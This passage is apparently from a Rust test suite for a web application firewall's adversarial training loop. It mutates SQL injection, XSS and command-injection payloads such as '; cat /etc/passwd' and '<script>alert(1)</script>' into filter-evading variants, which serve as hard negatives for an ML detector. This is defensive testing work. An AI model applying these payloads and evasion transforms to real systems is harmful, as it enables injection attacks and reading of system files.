    }

    #[test]
    fn adversarial_loop_feeds_trainer_end_to_end() {
        use crate::ddos::{ml_score_v2::MlScorerV2, ml_training::MlTrainer};
        use std::sync::Arc;
        let scorer = Arc::new(MlScorerV2::new(true));
        let trainer = MlTrainer::new(scorer);
        let mutations = MutationSet::sqli_default();
        let runner = AdversarialRunner {
            mutations: &mutations,
            seed_corpus: default_sqli_seed_corpus(),
            variants_per_seed: 20,
            chain_len: 2,
            rng_seed: 7,
        };
        // Naive WAF: blocks only when "1=1" literal still appears.
        // The OperatorSwap + KeywordCommentSplit mutators should
        // produce variants that defeat it.
        let bypasses = runner.run(|p| p.contains("1=1"));
        assert!(!bypasses.is_empty());
        // Feed every bypass into the trainer as a hard negative.
        let n = bypasses.len();
        for b in &bypasses {
            trainer.add_sample(bypass_to_training_sample(b));
        }
        assert_eq!(trainer.sample_count(), n);
    }

    // ── V148 XSS mutator tests ────────────────────────────────────

    #[test]
    fn html_entity_encode_replaces_first_lt_gt() {
        let out = HtmlEntityEncode
            .mutate("<script>alert(1)</script>", &mut rng(0))
            .unwrap();
        // Some entity form for the first < and >.
        let has_entity = out.contains("&lt;script&gt;")
            || out.contains("&#60;script&#62;")
            || out.contains("&#x3C;script&#x3E;")
            || out.contains("&LT;script&GT;");
        assert!(has_entity, "no entity in {out}");
    }

    #[test]
    fn html_entity_encode_skips_no_angle_brackets() {
        assert!(HtmlEntityEncode.mutate("alert(1)", &mut rng(0)).is_none());
    }

    #[test]
    fn tag_whitespace_injects_inside_tag() {
        let out = TagWhitespace.mutate("<script>", &mut rng(1)).unwrap();
        // Closing > shifts one char to the right.
        assert!(out.len() > "<script>".len());
        assert!(out.contains("<script"));
        assert!(out.ends_with('>'));
    }

    #[test]
    fn event_swap_replaces_onerror() {
        let out = EventSwap.mutate("<img onerror=alert(1)>", &mut rng(0));
        if let Some(s) = out {
            assert!(s.contains("onclick=") || s.contains("onerror="));
        }
    }

    #[test]
    fn js_unicode_escape_encodes_first_letter() {
        let out = JsUnicodeEscape.mutate("alert(1)", &mut rng(0)).unwrap();
        assert!(out.starts_with("\\u00"));
        assert!(out.contains("lert(1)"));
    }

    #[test]
    fn xss_default_includes_expected_mutators() {
        let s = MutationSet::xss_default();
        let names: Vec<&'static str> = s.mutators.iter().map(|m| m.name()).collect();
        assert!(names.contains(&"html_entity_encode"));
        assert!(names.contains(&"tag_whitespace"));
        assert!(names.contains(&"event_handler_swap"));
        assert!(names.contains(&"js_unicode_escape"));
    }

    #[test]
    fn xss_fan_out_defeats_naive_predicate() {
        let s = MutationSet::xss_default();
        let runner = AdversarialRunner {
            mutations: &s,
            seed_corpus: vec!["<script>alert(1)</script>".into()],
            variants_per_seed: 30,
            chain_len: 2,
            rng_seed: 555,
        };
        // Naive WAF: blocks if literal "<script>" appears.
        let bypasses = runner.run(|p| p.contains("<script>"));
        assert!(
            !bypasses.is_empty(),
            "XSS WAF must be defeated by some mutation"
        );
    }

    #[test]
    fn xss_seed_corpus_has_canonical_payloads() {
        let c = default_xss_seed_corpus();
        assert!(c.iter().any(|p| p.contains("<script>")));
        assert!(c.iter().any(|p| p.contains("onerror=")));
        assert!(c.iter().any(|p| p.contains("javascript:")));
    }

    // ── V148 cmd-injection mutator tests ──────────────────────────

    #[test]
    fn ifs_substitution_replaces_spaces() {
        let out = IfsSubstitution
            .mutate("cat /etc/passwd", &mut rng(0))
            .unwrap();
        assert!(!out.contains(' '));
        assert!(out.contains("${IFS}"));
    }

    #[test]
    fn ifs_substitution_skips_no_spaces() {
        assert!(IfsSubstitution.mutate("`id`", &mut rng(0)).is_none());
    }

    #[test]
    fn cmd_separator_swap_replaces_semicolon() {
        let out = CmdSeparatorSwap.mutate("; ls", &mut rng(0)).unwrap();
        // First semicolon replaced with one of the alternatives.
        assert!(
            out.starts_with("&&")
                || out.starts_with("||")
                || out.starts_with('|')
                || out.starts_with("%0a")
        );
    }

    #[test]
    fn cmd_separator_swap_skips_no_semicolon() {
        assert!(CmdSeparatorSwap.mutate("`id`", &mut rng(0)).is_none());
    }

    #[test]
    fn backtick_to_dollar_paren_swaps_simple_form() {
        let out = BacktickToDollarParen
            .mutate("echo `id` here", &mut rng(0))
            .unwrap();
        assert!(out.contains("$(id)"));
        assert!(!out.contains('`'));
    }

    #[test]
    fn backtick_to_dollar_paren_skips_no_backticks() {
        assert!(
            BacktickToDollarParen
                .mutate("echo hello", &mut rng(0))
                .is_none()
        );
    }

    #[test]
    fn path_globbing_inserts_wildcard() {
        let out = PathGlobbing.mutate("cat /etc/passwd", &mut rng(7)).unwrap();
        // Wildcard char somewhere in the path.
        assert!(out.contains('?') || out.contains('*'));
    }

    #[test]
    fn cmd_default_includes_expected_mutators() {
        let s = MutationSet::cmd_default();
        let names: Vec<&'static str> = s.mutators.iter().map(|m| m.name()).collect();
        assert!(names.contains(&"ifs_substitution"));
        assert!(names.contains(&"cmd_separator_swap"));
        assert!(names.contains(&"backtick_to_dollar_paren"));
        assert!(names.contains(&"path_globbing"));
    }

    #[test]
    fn cmd_fan_out_defeats_naive_predicate() {
        let s = MutationSet::cmd_default();
        let runner = AdversarialRunner {
            mutations: &s,
            seed_corpus: vec!["; cat /etc/passwd".into()],
            variants_per_seed: 30,
            chain_len: 2,
            rng_seed: 777,
        };
        let bypasses = runner.run(|p| p.contains("; cat /etc/passwd"));
        assert!(!bypasses.is_empty());
    }

    #[test]
    fn cmd_seed_corpus_has_canonical_payloads() {
        let c = default_cmd_seed_corpus();
        assert!(c.iter().any(|p| p.contains("/etc/passwd")));
        assert!(c.iter().any(|p| p.contains('`')));
        assert!(c.iter().any(|p| p.contains("$(")));
    }

    // ── V151 — background adversarial loop tests ──────────────────

    #[test]
    fn adversarial_loop_with_naive_predicate_emits_samples() {
        use crate::ddos::{ml_score_v2::MlScorerV2, ml_training::MlTrainer};
        use std::sync::Arc;
        let trainer = Arc::new(MlTrainer::new(Arc::new(MlScorerV2::new(true))));
        // Naive WAF: only blocks if the literal substrings are present.
        let predicate: Arc<dyn Fn(&str) -> bool + Send + Sync> = Arc::new(|p: &str| {
            p.contains("' OR 1=1") || p.contains("<script>") || p.contains("; cat ")
        });
        let lp = AdversarialLoop::with_default_mutation_sets(trainer.clone(), predicate);
        let stats = lp.run_once();
        assert!(stats.seeds_run > 0);
        assert!(stats.variants_tested > 0);
        assert!(
            stats.bypasses_found > 0,
            "naive WAF must miss some variants"
        );
        assert_eq!(trainer.sample_count(), stats.samples_emitted);
    }

    #[test]
    fn adversarial_loop_respects_max_bypasses_per_cycle() {
        use crate::ddos::{ml_score_v2::MlScorerV2, ml_training::MlTrainer};
        use std::sync::Arc;
        let trainer = Arc::new(MlTrainer::new(Arc::new(MlScorerV2::new(true))));
        // Predicate always misses → every variant becomes a bypass.
        let predicate: Arc<dyn Fn(&str) -> bool + Send + Sync> = Arc::new(|_| false);
        let mut lp = AdversarialLoop::with_default_mutation_sets(trainer.clone(), predicate);
        lp.max_bypasses_per_cycle = 5;
        let stats = lp.run_once();
        assert_eq!(stats.samples_emitted, 5);
        assert_eq!(trainer.sample_count(), 5);
        // Bypasses_found can exceed the cap (counted before the gate).
        assert!(stats.bypasses_found >= 5);
    }

    #[test]
    fn adversarial_loop_perfect_defender_emits_nothing() {
        use crate::ddos::{ml_score_v2::MlScorerV2, ml_training::MlTrainer};
        use std::sync::Arc;
        let trainer = Arc::new(MlTrainer::new(Arc::new(MlScorerV2::new(true))));
        // Predicate always catches → no bypass, no labels.
        let predicate: Arc<dyn Fn(&str) -> bool + Send + Sync> = Arc::new(|_| true);
        let lp = AdversarialLoop::with_default_mutation_sets(trainer.clone(), predicate);
        let stats = lp.run_once();
        assert_eq!(stats.bypasses_found, 0);
        assert_eq!(stats.samples_emitted, 0);
        assert_eq!(trainer.sample_count(), 0);
    }

    #[test]
    fn adversarial_loop_advances_seed_between_cycles() {
        use crate::ddos::{ml_score_v2::MlScorerV2, ml_training::MlTrainer};
        use std::sync::Arc;
        let trainer = Arc::new(MlTrainer::new(Arc::new(MlScorerV2::new(true))));
        let predicate: Arc<dyn Fn(&str) -> bool + Send + Sync> = Arc::new(|_| true);
        let lp = AdversarialLoop::with_default_mutation_sets(trainer, predicate);
        let s1 = lp.rng_seed.load(std::sync::atomic::Ordering::Relaxed);
        lp.run_once();
        let s2 = lp.rng_seed.load(std::sync::atomic::Ordering::Relaxed);
        assert_eq!(s2, s1 + 1);
    }

    #[test]
    fn splitmix_is_deterministic_for_same_seed() {
        let mut a = Splitmix64::new(42);
        let mut b = Splitmix64::new(42);
        for _ in 0..10 {
            assert_eq!(a.next_u64(), b.next_u64());
        }
    }
}
